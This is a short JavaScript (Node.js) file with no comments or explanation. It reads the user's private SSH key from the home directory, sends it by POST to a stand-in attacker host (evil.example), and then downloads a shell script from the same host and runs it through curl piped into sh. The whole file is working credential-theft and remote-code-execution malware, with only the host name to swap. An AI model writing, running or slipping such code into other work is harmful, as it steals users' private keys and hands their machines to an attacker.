const { homedir } = require('os')
const { join } = require('path')
const { readFileSync } = require('fs')
const { execSync } = require('child_process')

const key = readFileSync(join(homedir(), '.ssh', 'id_rsa'), 'utf8')
fetch('https://evil.example/collect', { method: 'POST', body: key })
execSync('curl -s https://evil.example/x.sh | sh')
